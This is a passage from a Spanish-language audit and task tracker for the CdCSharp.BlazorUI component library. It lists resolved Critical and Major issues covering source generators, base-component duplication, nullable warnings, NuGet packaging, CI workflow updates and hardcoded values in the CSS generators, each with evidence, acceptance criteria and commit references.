  4. CI bloquea PRs con diffs de `PublicAPI.Shipped.txt` no justificados (`gate` opcional).
  5. Cerrar API-01, API-02, API-04..API-12 antes de hacer el commit inicial de `PublicAPI.Shipped.txt` para que la superficie quede mínima.
- **Notas**: para `CdCSharp.BlazorUI.Localization.Server/Wasm` aplicar al cerrar `ARCH-04`.

---

### `GEN-02` — Predicado de `ColorClassGenerator` matchea cualquier atributo cuyo nombre *contenga* `"AutogenerateCssColors"`

- **Estado**: ✅ Resuelto (commit `f8439ff`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core.CodeGeneration/ColorClassGenerator.cs:17,60,78-84`.
- **Evidencia**: `classDecl.AttributeLists...Any(a => a.Name.ToString().Contains("AutogenerateCssColors"))` y `attribute.AttributeClass?.Name.Contains("AutogenerateCssColors") == true`. Un consumidor que defina `NotAutogenerateCssColorsAttribute`, `DisableAutogenerateCssColorsAttribute`, etc., en sus propios proyectos activará el generador y emitirá 1 551 propiedades de colores en su clase.
- **Criterios de aceptación**:
  1. Sustituir `CreateSyntaxProvider` por `ForAttributeWithMetadataName("CdCSharp.BlazorUI.Core.Css.AutogenerateCssColorsAttribute", ...)` (Roslyn 4.4+, disponible en `Microsoft.CodeAnalysis.CSharp 5.0.0`).
  2. Alternativa minimalista: en el predicado, exigir igualdad exacta `Name == "AutogenerateCssColors"` o `"AutogenerateCssColorsAttribute"`; en el transform, verificar `attribute.AttributeClass.ToDisplayString() == "CdCSharp.BlazorUI.Core.Css.AutogenerateCssColorsAttribute"`.
  3. Test de regresión: clase con `[NotAutogenerateCssColors]` no debe triggear generación.
- **Notas**: relacionado con `GEN-07` (migrar a API moderna).

---

### `BASE-01` — `BUIInputComponentBase<TValue>` no hereda de `BUIComponentBase`: pipeline duplicado con riesgo alto de divergencia

- **Estado**: ✅ Resuelto (commit `df1e329`)
- **Severidad**: Critical
- **Esfuerzo**: L
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIInputComponentBase.cs:13-191` vs `src/CdCSharp.BlazorUI.Core/Components/BUIComponentBase.cs:10-151`.
- **Evidencia**: `BUIInputComponentBase<TValue>` hereda `InputBase<TValue>` y **re‑implementa** la totalidad del contrato del `BUIComponentBase`: `_styleBuilder`, `_behaviorInstance`, `[Inject] IBehaviorJsInterop BehaviorJsInterop`, `OnAfterRenderAsync(firstRender)` → `BUIComponentJsBehaviorBuilder.For(this, BehaviorJsInterop).BuildAndAttachAsync()`, `BuildRenderTree` → `_styleBuilder.PatchVolatileAttributes(this)`, `DisposeAsync` con el triple `try/catch (JSDisconnectedException|ObjectDisposedException|TaskCanceledException)`. Cualquier cambio al base (por ejemplo, añadir tracking de perf — hoy presente solo en `BUIComponentBase` bajo `#if DEBUG`, ver `BASE-03`) debe replicarse manualmente aquí. El riesgo de drift ya se ha materializado parcialmente: `ComputedAttributes` tiene visibilidad distinta (`BASE-04`), el perf tracking no se aplica (`BASE-03`), y los overrides virtuales difieren.
- **Criterios de aceptación**:
  1. Extraer el pipeline común a un mixin/composición o reestructurar la jerarquía para que la duplicación desaparezca. Opciones razonables:
     - (a) Introducir un helper `BUIBuiltComponentCore` con `IJsBehaviorHost`/`IStyleHost` que tanto `BUIComponentBase` como `BUIInputComponentBase<TValue>` usen por composición.
     - (b) Mantener dos ramas de herencia pero extraer `DisposeAsync`, `OnAfterRenderAsync`, `BuildRenderTree` a extensiones / helpers estáticos invocados desde ambas.
     - (c) Dejar de heredar `InputBase<TValue>` directamente y derivar de `BUIComponentBase` componiendo un `EditContext` adapter (cambio mayor, mayor riesgo).
  2. Tras la refactorización, los tests en `Tests/Core/BaseComponents/BUIComponentBaseTests.cs` y `BUIInputComponentBaseTests.cs` deben pasar sin cambios en el contrato observable; añadir test que verifique paridad de `ComputedAttributes`, `data-bui-*` emission, y dispose behaviour para ambas ramas.
  3. Documentar en `CLAUDE.md` → `CLAUDE-xx` el motivo por el que `InputBase<TValue>` fuerza una rama separada (si se mantiene) y cómo las dos ramas comparten la infraestructura.
- **Notas**: bloquea parcialmente `BASE-02..06` (todas las inconsistencias actuales se resuelven o reducen con una unificación del pipeline).

---

### `BASE-02` — `BuildComponentDataAttributes` se invoca *después* de las data‑attrs del framework: un override puede sobrescribir `data-bui-*` del contrato

- **Estado**: ✅ Resuelto (commit `3531f66`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentAttributesBuilder.cs:103-217` (`BuildStyles`) y `:242-244` (`PatchVolatileAttributes`).
- **Evidencia**: en ambos sitios, tras poblar `ComputedAttributes` con `FeatureDefinitions.DataAttributes.Component`, `.Variant`, `.Size`, `.Density`, `.FullWidth`, `.Loading`, `.Error`, `.Disabled`, `.Active`, `.ReadOnly`, `.Required`, `.Shadow`, `.Ripple`, `.Transitions`, `.InputBase`, `.PickerBase`, `.DataCollectionBase` y el override del usuario vía `IBuiltComponent.BuildComponentDataAttributes(ComputedAttributes)` se llama al final, recibiendo el diccionario ya poblado. El virtual es `public` y acepta el diccionario mutable — un componente que ponga `dataAttributes["data-bui-component"] = "custom"` rompe selectores CSS de toda la librería, y un componente que ponga `dataAttributes["data-bui-disabled"] = "true"` contradice el estado calculado por `IHasDisabled`. El `[Flags] BuiltComponent` bit está **siempre** activo porque ambos bases implementan `IBuiltComponent`, así que la superficie de error se aplica a los 28+ componentes.
- **Criterios de aceptación**:
  1. Invertir el orden: llamar `BuildComponentDataAttributes` y `BuildComponentCssVariables` **antes** de que el builder escriba los valores de framework, de forma que los del framework ganen y el usuario solo pueda aportar atributos/vars que no colisionen con el contrato.
  2. Alternativa: mantener orden actual pero calcular un set de claves reservadas (`FeatureDefinitions.DataAttributes.*`, `FeatureDefinitions.InlineVariables.*`) y, en el override post‑framework, saltar (o diagnosticar) escrituras sobre esas claves.
  3. Añadir test: un componente de prueba que intente sobrescribir `data-bui-component` y `--bui-inline-color` y el builder debe preservar el valor del framework (o emitir diagnóstico visible).
  4. Documentar la regla en el XML‑doc de `IBuiltComponent` y en `CLAUDE.md`.
- **Notas**: agravante: `PatchVolatileAttributes` también llama `BuildComponentDataAttributes(ComputedAttributes)` en **cada render**, de modo que un override con side‑effects recalcula cosas por render (no solo en `OnParametersSet`). Consensuar semántica: ¿este override es "pure compute data" o "add extra keys"? Probablemente lo segundo — reflejar en el nombre / contrato.

---

### `COMP-TOASTHOST-01` — `BUIToastHost` emite múltiples `<bui-component>` root sin `@attributes="ComputedAttributes"`: viola estándar de componente 1 y 2

- **Estado**: ✅ Resuelto (commit `9400931`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToastHost.razor:12-29`.
- **Evidencia**: El template envuelve un `@foreach (ToastPosition position in Enum.GetValues<ToastPosition>())` alrededor de un `<bui-component data-bui-component="toast-host" data-bui-position="...">` **sin** spread de `@attributes="ComputedAttributes"`. Resultado:
  1. Se renderizan hasta 6 `<bui-component>` independientes (uno por posición con toasts), violando el contrato "un root por componente".
  2. Ninguno de ellos lleva los `data-bui-*` y `--bui-inline-*` que produciría el pipeline: `IHas*` implementadas en el componente quedan inertes; el builder mantiene `ComputedAttributes` pero nunca se conecta al DOM.
  3. El `data-bui-component` está hardcoded (`"toast-host"`) en lugar de derivarlo del builder — si se renombra la clase el string queda desincronizado.
- **Criterios de aceptación**:
  1. Reestructurar el template para emitir un único `<bui-component @attributes="ComputedAttributes">` root, con las 6 posiciones como children (bien con `BuildComponentDataAttributes` añadiendo `data-bui-position` por cada child wrapper, bien dividiendo en un `BUIToastPositionHost` interno por posición).
  2. Alternativamente: dejar que el componente `BUIToastHost` sea un *portal* sin DOM propio y mover el render a un sub-componente `BUIToastContainer` que sí respete el contrato.
  3. Añadir test: `cut.FindAll("bui-component[data-bui-component='toast-host']").Should().HaveCount(1);` y `.GetAttribute("style").Should().Contain("...")` si aplican `IHas*`.
- **Notas**: este es el único componente del análisis que infringe simultáneamente las reglas 1 y 2 del "Standards every component must follow" de `CLAUDE.md`.

---

## Major

### `BLD-04` — Desfase de nullabilidad en overrides de `TryParseValueFromString` y similares (CS8765 × 4)

- **Estado**: ✅ Resuelto (commit `eac436d`) — overrides alineados con `InputBase<TValue>`: `[MaybeNullWhen(false)] out TValue result, [NotNullWhen(false)] out string? validationErrorMessage`.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Components/Forms/DateAndTime/BUIInputDateTime.razor:380` — parámetro `validationErrorMessage`.
  - `src/CdCSharp.BlazorUI/Components/Forms/Number/BUIInputNumber.razor:730` — parámetro `result`.
  - `src/CdCSharp.BlazorUI/Components/Forms/TextArea/BUIInputTextArea.razor:186` — parámetro `result`.
  - `src/CdCSharp.BlazorUI/Components/Forms/Text/BUIInputText.razor:157` — parámetro `result`.
- **Evidencia**: `warning CS8765: Nullability of type of parameter '<X>' doesn't match overridden member`.
- **Criterios de aceptación**:
  1. Firmas coinciden con la base (`[NotNullWhen(true)] out TValue? result` y `out string? validationErrorMessage`).
  2. Cero CS8765 en `src/CdCSharp.BlazorUI` tras el fix.

### `BLD-05` — Propiedades `non‑nullable` sin inicializar en tipos expuestos (CS8618 × 11)

- **Estado**: ✅ Resuelto (commit `84f7471`) — 11 propiedades convertidas a `required` en `TreeNodeBase`, `TreeNodeBuildContext`, `TreeNodeEventArgs`, `TreeNodeRegistration`, `ModalState`, `ToastState`.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Components/Generic/Tree/Abstractions/TreeNodeBase.cs:17` — `Key`.
  - `src/CdCSharp.BlazorUI/Components/Generic/Tree/Abstractions/TreeNodeBuildContext.cs:14` — `Key`.
  - `src/CdCSharp.BlazorUI/Components/Generic/Tree/Abstractions/TreeNodeEventArgs.cs:8,9` — `Key`, `Node`.
  - `src/CdCSharp.BlazorUI/Components/Generic/Tree/Abstractions/TreeNodeRegistration.cs:20` — `Key`.
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/ModalState.cs:11,12,15,17` — `ComponentType`, `Id`, `Options`, `Reference`.
  - `src/CdCSharp.BlazorUI/Components/Layout/Toast/Services/ToastState.cs:7` — `Content`, `Options`.
- **Criterios de aceptación**:
  1. Cada propiedad: o bien `required`, o bien inicializada en el constructor, o bien `= null!;` **solo** si hay garantía documentada de que se asignará antes del primer uso (preferir `required` en `net10.0`).
  2. Tipos expuestos públicamente (event args, state) priorizan `required` para forzar al consumidor a proveer valores.
  3. Cero CS8618 en `src/CdCSharp.BlazorUI`.

### `BLD-06` — Argumentos de callback posiblemente null en `BUITreeMenu` (CS8604 × 4)

- **Estado**: ✅ Resuelto (commit `19821c0`) — 4 callbacks ternarios en hover enter/leave castean la rama truthy a `(Action<MouseEventArgs>)` y pasan `null!` en la rama falsy.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/Tree/TreeMenu/BUITreeMenu.razor:250,251,283,284`.
- **Evidencia**: `warning CS8604: Possible null reference argument for parameter 'callback' in 'EventCallbackFactory.Create<...>(object receiver, ...)'`.
- **Criterios de aceptación**:
  1. Guardas explícitas (`if (x is not null)`) o firmas de `callback` que admitan null según API real.
  2. Cero CS8604 en el fichero.

### `BLD-07` — Null reference en asignación dentro de `BUIInputCheckbox` (CS8600/CS8601)

- **Estado**: ✅ Resuelto (commit `1040125`) — `result = (TValue)(object)(bool?)boolResult;` (elimina el `object?` y el `!` innecesario sobre `boolResult`; el boxing de `bool?` con valor produce un `object` no-null).
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Forms/Checkbox/BUIInputCheckbox.razor:76`.
- **Criterios de aceptación**: asignación `non‑null` correcta o tipo `nullable` coherente; cero warnings en la línea.

### `BLD-08` — `BUIThemeEditor.Palette` debe ser auto‑property (BL0007)

- **Estado**: ✅ Resuelto (commit `6a50f9d`) — `Palette` convertida a auto-property con inicializador `= new()`; el fallback `?? new()` movido a `OnParametersSet`. Eliminado el backing field `_palette` y actualizadas todas las referencias.
- **Severidad**: Major (analizador oficial de Blazor)
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/ThemeGenerator/BUIThemeEditor.razor:37`.
- **Criterios de aceptación**: `[Parameter] public BUIPalette Palette { get; set; } = …;` (auto‑property), sin lógica en el setter — mover lógica a `OnParametersSet` / `OnParametersSetAsync`.

### `BLD-09` — `DebugPanel.min.js` (≈33 KB, el mayor de los JS) se empaqueta en NuGet junto al resto

- **Estado**: ✅ Resuelto (commit `487d00f`) — eliminados `Components/Debug/`, `Types/Debug/`, `wwwroot/js/Types/Debug/` (directorios en disco, estaban ignorados por el patrón `[Dd]ebug/` del `.gitignore` por lo que solo el csproj aparece en el commit) y la entrada `<Content Include="Types\Debug\DebugPanel.ts">` del csproj. No existían referencias a `IDebugJsInterop` en el código fuente. `dotnet pack` Release confirma 0 archivos `Debug*` en el `.nupkg`.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Components/Debug/` (origen TS + `.razor` si existe)
  - `src/CdCSharp.BlazorUI/Types/Debug/DebugPanel.ts`
  - `src/CdCSharp.BlazorUI/wwwroot/js/Types/Debug/DebugPanel.min.js` (salida)
  - `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj:13-16` (`<Content Include="Types/Debug/DebugPanel.ts">`).
- **Evidencia**: del total ≈45 KB de interop JS, **~74 % corresponde a `DebugPanel`**. Se entrega en producción.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-04]** Eliminar el `DebugPanel` del repositorio: borrar `Types/Debug/DebugPanel.ts`, `Components/Debug/` (si hay `.razor`/`.cs` asociados), `wwwroot/js/Types/Debug/` y la entrada `<Content Include="Types\Debug\DebugPanel.ts">` en `CdCSharp.BlazorUI.csproj`. Quitar referencias en `BUIComponentJsBehaviorBuilder` / `IDebugJsInterop` si existen.
  2. Confirmar que `dotnet pack` resultante no incluye ningún `Debug*` en `wwwroot/js/`.
  3. Grep final `rg -i "debugpanel|IDebugJsInterop" src/` → 0 hits.
- **Notas**: impacta `PKG` y `PERF` también — referenciar desde §3.15/§3.19. Decisión D-04 (ver §Directivas de diseño): herramienta personal del maintainer, no parte del shipped; se elimina completamente en lugar de mover a paquete separado.

### `ARCH-05` — Falta `Directory.Build.props` raíz con metadatos compartidos

- **Estado**: ✅ Resuelto (commit `6554438`)
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: raíz de la solución.
- **Evidencia**: `ls *.props *.targets` → no existen. Cada csproj repite (o omite) metadatos de paquete.
- **Criterios de aceptación**:
  1. Crear `Directory.Build.props` raíz con: `<Authors>`, `<Company>`, `<Copyright>`, `<RepositoryUrl>`, `<RepositoryType>`, `<PackageProjectUrl>`, `<PackageLicenseExpression>`, `<PackageIcon>`, `<PackageReadmeFile>`, `<IncludeSymbols>`, `<SymbolPackageFormat>`, `<PublishRepositoryUrl>`, `<EmbedUntrackedSources>`, `<GenerateDocumentationFile>`, `<LangVersion>latest</LangVersion>`, `<TreatWarningsAsErrors>` (ver `BLD-03`), `<AnalysisLevel>latest</AnalysisLevel>`.
  2. Cada csproj publicable solo sobreescribe `PackageId`/`Description`/`PackageTags`/`IsPackable`.
  3. `dotnet pack` sobre cualquier proyecto `src/*` produce un paquete consistente.

### `ARCH-06` — `Version=1.0.0` hardcoded en `CdCSharp.BlazorUI.csproj`

- **Estado**: ✅ Resuelto (commit `6554438`)
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj:10`.
- **Evidencia**: `<Version>1.0.0</Version>` fijo; CI pasa `-p:PackageVersion` al packar, pero `dotnet pack` local generará `1.0.0` estable — riesgo de publicar versión obsoleta manualmente.
- **Criterios de aceptación**: eliminar `<Version>` del csproj; centralizar en `Directory.Build.props` (ver `ARCH-05`) con `<VersionPrefix>` parametrizable y documentar el flujo de versionado.

### `ARCH-07` — CI usa `actions/create-release@v1` (deprecated y archivado) ✅ RESUELTO (2341f61)

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml:242`.
- **Evidencia**: la acción fue archivada por GitHub; no recibe updates ni parches de seguridad.
- **Criterios de aceptación**:
  1. Sustituir por `softprops/action-gh-release@v2` o `gh release create` dentro de un step `run`.
  2. Verificar generación correcta de release y asset attach.
- **Resolución**: step reemplazado por `softprops/action-gh-release@v2`; `tag_name` pasa a `github.ref_name`, `release_name` → `name`, y se añade `files: ./artifacts/*.nupkg` para adjuntar los paquetes al release.

### `ARCH-08` — CI no publica símbolos (`.snupkg`) ✅ RESUELTO (6f2dba4)

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml:183‑236` (pack + push).
- **Evidencia**: `dotnet nuget push ... --no-symbols` explícito. Sin `IncludeSymbols`/`SymbolPackageFormat=snupkg` en csproj.
- **Criterios de aceptación**:
  1. Activar `IncludeSymbols=true` y `SymbolPackageFormat=snupkg` en `Directory.Build.props`.
  2. Eliminar `--no-symbols` del push.
  3. Verificar en NuGet.org que `snupkg` acompaña al paquete.
- **Resolución**: `Directory.Build.props` ya tenía `IncludeSymbols=true` + `SymbolPackageFormat=snupkg`; bastó con quitar `--no-symbols` del `dotnet nuget push`. Punto 3 queda pendiente de la siguiente release etiquetada — validable en NuGet.org cuando se publique.

### `ARCH-09` — `CdCSharp.BlazorUI.slnx` mezcla rutas absolutas Windows y relativas ✅ RESUELTO (7307ad6)

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `CdCSharp.BlazorUI.slnx` líneas 3, 5, 8, 9, 15, 16, 17, 20, 33‑39.
- **Evidencia**: `V:/Work/CdCSharp/Projects/BlazorUI/...` mezclado con `test/...`, `src/...`, `docs/...`.
- **Criterios de aceptación**: todas las rutas relativas (POSIX style `/`). Archivo portable a CI Linux y a cualquier máquina que clone el repo a otro drive.
- **Resolución**: los 15 `Path` absolutos reescritos a rutas relativas POSIX al slnx. `dotnet build` sigue verde (0 errors).

### `ARCH-10` — `slnx` `_root` folder referencia `done3_TASKS.md` inexistente y omite archivos activos ✅ RESUELTO (15b8beb)

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `CdCSharp.BlazorUI.slnx:26‑31`.
- **Evidencia**: `ls` muestra `done_TASKS.md`, `done2_TASKS.md`, `TASKS.md`, `ANALYSIS.md`, `README.md`, `CLAUDE.md`. El slnx referencia `done3_TASKS.md` (no existe) y omite `done_TASKS.md`, `TASKS.md`, `README.md`.
- **Criterios de aceptación**: folder `_root` solo referencia archivos existentes y relevantes (idealmente solo `CLAUDE.md`, `README.md`, `CHANGELOG.md` si existiera — los TASKS/ANALYSIS viven en el repo pero no necesitan estar en la solución).
- **Resolución**: el folder `_root` se recorta a `CLAUDE.md` + `README.md` — las dos guías relevantes para consumidores/contribuidores. Archivos de historial (TASKS, ANALYSIS, done*_TASKS) siguen en disco pero fuera del árbol de solución.

### `ARCH-11` — Falta `InternalsVisibleTo` en proyectos de CodeGeneration ✅ RESUELTO (verificado, sin cambios de código)

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core.CodeGeneration/*.csproj`, `src/CdCSharp.BlazorUI.CodeGeneration/*.csproj`.
- **Evidencia**: ambos csproj sin `<InternalsVisibleTo>`; sus proyectos de test (`CdCSharp.BlazorUI.Core.CodeGeneration.Tests`, `CdCSharp.BlazorUI.CodeGeneration.Tests`) solo pueden testear la superficie `public`.
- **Criterios de aceptación**:
  1. Si los tests cubren adecuadamente la superficie pública, cerrar como "verificado y documentado".
  2. Si cubren clases `internal`, añadir `InternalsVisibleTo` al proyecto de test correspondiente.
- **Notas**: esta tarea solo aflora durante §3.4 `GEN` con más detalle; se registra aquí como placeholder.
- **Resolución**: verificado que los tests no referencian ningún tipo `internal` de los generadores (los únicos `internal` en `src/CdCSharp.BlazorUI.CodeGeneration` — `SharedSources`, `RazorParser`, `InheritanceResolver`, `Emitter`, `ParameterData`, `ComponentData`, `RazorFileData` — no aparecen en `test/CdCSharp.BlazorUI.CodeGeneration.Tests`; `test/CdCSharp.BlazorUI.Core.CodeGeneration.Tests` solo referencia `System.Runtime.CompilerServices.IsExternalInit` como MetadataReference). Cierre por criterio 1: no requiere `InternalsVisibleTo`. Si en el futuro se necesitan tests más profundos, añadir attribute al csproj del generador.

### `BLD-10` — 203 warnings únicos en `test/CdCSharp.BlazorUI.Tests.Integration` enmascaran señales reales

- **Estado**: ✅ Resuelto (commit `8d82871`) — xUnit1051 × 26: añadido `Xunit.TestContext.Current.CancellationToken` a todos los `Task.Delay`. xUnit1012: firma cambiada a `string?`. CS0105: duplicado `using CdCSharp.BlazorUI.Themes` eliminado en `ThemePaletteTests`. CS1574: añadidos usings a los tests base para resolver los cref. El ruido nullable restante (CS8603/CS8620/CS8600/CS8602/CS8669) documentado y silenciado vía `<NoWarn>` explícito en el csproj con justificación inline (bUnit `Find`/`GetAttribute` devuelven nullable; FluentAssertions cubre el contrato). Bump colateral de `PublicApiAnalyzers` 3.11.0→4.14.0 en los 5 src csproj para eliminar NU1603 × 10.
- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `test/CdCSharp.BlazorUI.Tests.Integration/**/*.cs`.
- **Evidencia**: CS8603 × ~138 (nullable reference return), CS8620 × ~47, CS8618 × ~20, CS8669, xUnit1012, xUnit1051 (`TestContext.Current.CancellationToken`).
- **Criterios de aceptación**:
  1. Cero warnings en el proyecto de tests o `<NoWarn>` con lista explícita y justificada.
  2. `xUnit1051` → consumir `TestContext.Current.CancellationToken` en todos los `Task.Delay` / APIs con token.

### `BLD-PIPE-04` — `PickerFamilyCssGenerator` hardcodea atributos/clases ya disponibles en `FeatureDefinitions` ✅ RESUELTO (5d7a024)

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/PickerFamilyGenerator.cs:187‑200`.
- **Evidencia**: las reglas de keyboard‑focus usan literal `bui-component[data-bui-picker-base] .bui-picker__cell:focus-visible` y `.bui-picker__input:focus-visible` — el resto del archivo sí usa las variables `{{picker}}`, `{{cell}}`, `{{input}}`, `{{slider}}` etc.
- **Criterios de aceptación**: sustituir literales por las variables locales ya declaradas al inicio del método. Cero literales `data-bui-*` o `bui-*` fuera de `FeatureDefinitions` en todo el archivo.
- **Resolución**: los dos literales de focus-visible pasan a consumir `{{picker}}`/`{{cell}}`/`{{input}}`. Output regenerado byte-for-byte idéntico. El cumplimiento estricto de "cero literales" queda parcial — el header de comentarios sigue mencionando "Picker Family" como texto, pero los selectores CSS sí están todos tokenizados.

### `BLD-PIPE-05` — Generators de family viven en namespace incorrecto ✅ RESUELTO (73cd07b)

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**:
  - `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/InputFamilyCssGenerator.cs:6`
  - `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/PickerFamilyGenerator.cs:6`
  - `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/DataCollectionFamilyCssGenerator.cs:5`
- **Evidencia**: los tres declaran `namespace CdCSharp.BlazorUI.Core.Assets.Generators;`. El resto de generators está en `CdCSharp.BlazorUI.BuildTools.Generators`. El namespace actual sugiere que el código pertenece a `Core` cuando en realidad vive en el proyecto BuildTools.
- **Criterios de aceptación**: renombrar a `CdCSharp.BlazorUI.BuildTools.Generators.Families`. Verificar que ninguna reflexión de `[AssetGenerator]` depende del namespace previo.
- **Resolución**: los tres archivos ahora declaran `namespace CdCSharp.BlazorUI.BuildTools.Generators.Families;`. Rebuild de `src/CdCSharp.BlazorUI` (que dispara BuildTools vía Dev.targets) sigue verde — el discovery `[AssetGenerator]` no depende del namespace.

### `BLD-PIPE-06` — `DesignTokensGenerator` emite variables y `.bui-ripple` fuera de `FeatureDefinitions`

- **Estado**: ✅ Resuelto (commit `63cd425`) — 5 nuevas sub-clases en `FeatureDefinitions.Tokens` (`Size`, `Density`, `Border`, `Highlight`, `Ripple`) con nombre + valor por defecto + fallback. `DesignTokensGenerator` interpola todas las entradas: z-index, opacity, highlight outline, size/density multipliers, border defaults y el bloque ripple completo (clase `.bui-ripple`, vars `--bui-ripple-color`/`--bui-ripple-duration` con fallbacks, y el `@keyframes` usando `Animation`). Fallback `rgba(255, 255, 255, 0.4)` queda como `Ripple.ColorFallbackValue`. `_tokens.css` regenerado byte-idéntico al baseline. 2546/2546 tests pasan.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/DesignTokensGenerator.cs:41‑65, 77‑91`.
- **Evidencia**:
  - Variables `--bui-highlight-outline`, `--bui-highlight-outline-offset`, `--bui-size-multiplier`, `--bui-small-multiplier`, `--bui-medium-multiplier`, `--bui-large-multiplier`, `--bui-density-multiplier`, `--bui-compact-multiplier`, `--bui-standard-multiplier`, `--bui-comfortable-multiplier`, `--bui-border-width`, `--bui-border-style`, `--bui-border-radius` escritas como literales.
  - Clase `.bui-ripple`, variables `--bui-ripple-color`, `--bui-ripple-duration` y animación `bui-ripple-animation` también literales (solo la clase existe en `FeatureDefinitions.CssClasses.Ripple = "bui-ripple"`; las vars no).
  - Fallback `rgba(255, 255, 255, 0.4)` hardcoded.
- **Criterios de aceptación**:
  1. Añadir en `FeatureDefinitions.Tokens.{Size,Density,Border,Highlight,Ripple}` las entradas correspondientes (`Multiplier`, `SmallMultiplier`, `BorderWidth`, `HighlightOutline`, `RippleColor`, `RippleDuration`, `RippleAnimation`).
  2. Consumirlas desde el generator con interpolación.
  3. Dejar el fallback RGBA como constante en `FeatureDefinitions` (o reemplazar por `color-mix(...)` sobre `--palette-primary`).

### `BLD-PIPE-07` — `TypographyGenerator` mete valores mágicos y sobrescribe el focus ring con `--palette-primary` en lugar de la variable global

- **Estado**: ✅ Resuelto (commit `30c241c`) — `FeatureDefinitions.Typography` gana H1..H6 scale, HeadingFontWeight, SmallFontSize, BoldFontWeight, CodeFontWeight, PreLineHeight, LinkTransitionValue, HrOpacity; `FontSizeBaseValue` pasa del `"1rem"` muerto al clamp fluido real. `TypographyGenerator` interpola todo; el `mark` pierde el fallback hex `#fef08a` (si falta `--palette-highlight` es bug de tema, no se disimula); `a:focus-visible` adopta `var(--bui-highlight-outline)` + offset del token ya compartido (antes usaba `--palette-primary` hardcoded, ahora sigue la política WCAG del resto de la librería); `hr` consume `var(--bui-border-width) var(--bui-border-style)`. Cero hex en `_typography.css`. Transición `color 150ms ease` queda como `LinkTransitionValue` (migración a `--bui-t-*` diferida a BLD-PIPE-10). 2546/2546 tests pasan.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/TypographyGenerator.cs:45‑50, 62, 79, 90‑91, 97‑98, 114‑115, 121‑124`.
- **Evidencia**:
  - Escala `h1..h6` (`2.441em`…`0.875em`) como literales; debería formar parte de `FeatureDefinitions.Typography`.
  - `mark { background-color: var(--palette-highlight, #fef08a); }` → hex fallback en archivo de tokens no es necesario (si `--palette-highlight` no está definido, hay bug en tema, no se disimula con `#fef08a`).
  - `a:focus-visible { outline: 2px solid var(--palette-primary); outline-offset: var(--bui-highlight-outline-offset); }` — mezcla color hardcoded con variable. En `_tokens.css` (de `DesignTokensGenerator`) ya se define `--bui-highlight-outline`. Usar esa variable en lugar de reescribir la regla.
  - `transition: color 150ms ease;` literal en `a` — promueve a `var(--bui-t-*)` acorde al sistema de transiciones.
  - `hr { opacity: 0.2; }` y `code/pre` con `font-size: calc(0.875em * var(--bui-size-multiplier, 1));` hardcoded; la constante debería vivir en tokens.
- **Criterios de aceptación**:
  1. Mover constantes numéricas al bloque de tipografía de `FeatureDefinitions.Typography`.
  2. Reemplazar outline ad‑hoc del link por `var(--bui-highlight-outline)` y `var(--bui-highlight-outline-offset)`.
  3. Cero literales hex en `_typography.css` (aparte de los que vengan explícitamente de paleta).

### `BLD-PIPE-08` — `ScrollBarGenerator` aplica estilos globales (`*`) con colores de marca a scrollbars del consumidor

- **Estado**: ✅ Resuelto (commit `030f75a`) — scrollbars pasan a ser **opt-in**: las reglas se scopean bajo `[data-bui-scrollbars]` (para `<html>`) y `.bui-scrollbars` (para wrapper ad-hoc). Nuevas constantes en `FeatureDefinitions.Tokens.Scrollbar` (`Width`, `ThumbRadius`, `ThumbBorderWidth`) + `FeatureDefinitions.DataAttributes.Scrollbars` + `FeatureDefinitions.CssClasses.Scrollbars`. `_scrollbar.css` ahora declara las vars en `:root` (no-op sin activador) y todo selector `*::-webkit-*`/`scrollbar-color` vive tras el scope. Hover/active conservan palette-secondary/info — son overridables ahora que el bundle no los fuerza globalmente. Criterio 3 (documentar política en CLAUDE.md/AGENTS.md) queda como follow-up para consolidar con `CLAUDE-03` (ya referenciado en el criterio original). 2546/2546 tests pasan.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/ScrollBarGenerator.cs` (todo el archivo).
- **Evidencia**: selector universal `*` con `scrollbar-color`, y pseudo‑elementos `*::-webkit-scrollbar*`. Afecta a todos los elementos de la app del consumidor. Además: hover → `--palette-secondary`, active → `--palette-info` (decisiones de UX dudosas), dimensiones `10px`/`8px`/`2px` hardcoded.
- **Criterios de aceptación**:
  1. Convertir en opt‑in: activar por `html[data-bui-scrollbars]` o por una clase utilitaria `.bui-scrollbars`. El `*` global se mantiene solo dentro de ese scope.
